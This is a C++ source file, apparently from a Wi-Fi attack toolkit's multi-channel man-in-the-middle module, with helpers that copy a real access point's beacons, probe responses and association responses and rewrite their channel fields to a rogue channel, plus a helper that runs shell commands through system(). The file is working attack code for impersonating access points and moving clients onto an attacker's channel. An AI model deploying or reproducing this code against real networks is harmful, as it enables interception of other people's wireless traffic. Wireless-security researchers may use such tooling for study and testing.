#include "attacks/mc_mitm/wifi_util.h"

#include <cstdio>
#include <fstream>
#include <regex>
#include <stdexcept>

#include <tins/tins.h>

#include "logger/log.h"
#include "system/hw_capabilities.h"

using namespace std;
using namespace Tins;

//TODO uklidit do hwcapabilities
void exec(const vector<string>& cmd, bool check) {
    string full;
    for (auto& s : cmd) full += s + " ";
    const int ret = system(full.c_str());
    if (check && ret != 0)
        throw runtime_error("Command failed: " + full);
}

string get_macaddress(const string& iface) {
    ifstream f("/sys/class/net/" + iface + "/address");
    string mac;
    getline(f, mac);
    return mac;
}

string get_ssid(const Dot11Beacon& beacon) {
    const auto opt = beacon.search_option(Dot11::SSID);
    if (!opt) return "";
    return std::string(opt->data_ptr(), opt->data_ptr() + opt->data_size());
}

Dot11ProbeResponse* beacon_to_probe_resp(const Dot11Beacon& beacon, const int rogue_channel) {
    auto* resp = new Dot11ProbeResponse();
    resp->addr2(beacon.addr2());
    resp->addr3(beacon.addr3());
    resp->timestamp(0xAAAAAAAAAAAAAAAAULL);
    resp->interval(beacon.interval());
    resp->capabilities() = beacon.capabilities();
    resp->remove_option(Dot11::DS_SET);
    resp->ds_parameter_set(rogue_channel);

    for (const auto& opt : beacon.options()) {
        if (opt.option() == IEEE_TLV_TYPE_TIM) continue;
        if (opt.option() == IEEE_TLV_TYPE_CHANNEL) continue;

        if (opt.option() == Dot11::HT_OPERATION && opt.data_size() >= 1) {
            vector ht_data(opt.data_ptr(), opt.data_ptr() + opt.data_size());
            ht_data[0] = rogue_channel;
            resp->add_option({Dot11::HT_OPERATION, ht_data.size(), ht_data.data()});
            continue;
        }

        resp->add_option(opt);
    }

    return resp;
}

//TODO move
Dot11Beacon* beacon_channel_patch(const Dot11Beacon& beacon, const int rogue_channel) {
    auto* resp = new Dot11Beacon();
    resp->addr2(beacon.addr2());
    resp->addr3(beacon.addr3());
    resp->timestamp(0xAAAAAAAAAAAAAAAAULL);
    resp->interval(beacon.interval());
    resp->capabilities() = beacon.capabilities();
    resp->remove_option(Dot11::DS_SET);
    resp->ds_parameter_set(rogue_channel);

    for (const auto& opt : beacon.options()) {
        if (opt.option() == IEEE_TLV_TYPE_TIM) continue;
        if (opt.option() == IEEE_TLV_TYPE_CHANNEL) continue;

        if (opt.option() == Dot11::HT_OPERATION && opt.data_size() >= 1) {
            vector ht_data(opt.data_ptr(), opt.data_ptr() + opt.data_size());
            ht_data[0] = rogue_channel;
            resp->add_option({Dot11::HT_OPERATION, ht_data.size(), ht_data.data()});
            continue;
        }

        resp->add_option(opt);
    }

    return resp;
}

Dot11AssocResponse* assoc_resp_channel_patch(const Dot11AssocResponse& assoc, const int rogue_channel) {
    auto* resp = new Dot11AssocResponse();
    resp->addr1(assoc.addr1());
    resp->addr2(assoc.addr2());
    resp->addr3(assoc.addr3());
    resp->capabilities() = assoc.capabilities();
    resp->status_code(assoc.status_code());
    resp->aid(assoc.aid());
    resp->seq_num(assoc.seq_num());

    for (const auto& opt : assoc.options()) {
        if (opt.option() == Dot11::HT_OPERATION && opt.data_size() >= 1) {
            vector ht_data(opt.data_ptr(), opt.data_ptr() + opt.data_size());
            ht_data[0] = rogue_channel;
            resp->add_option({Dot11::HT_OPERATION, ht_data.size(), ht_data.data()});
            continue;
        }
        resp->add_option(opt);
    }

    return resp;
}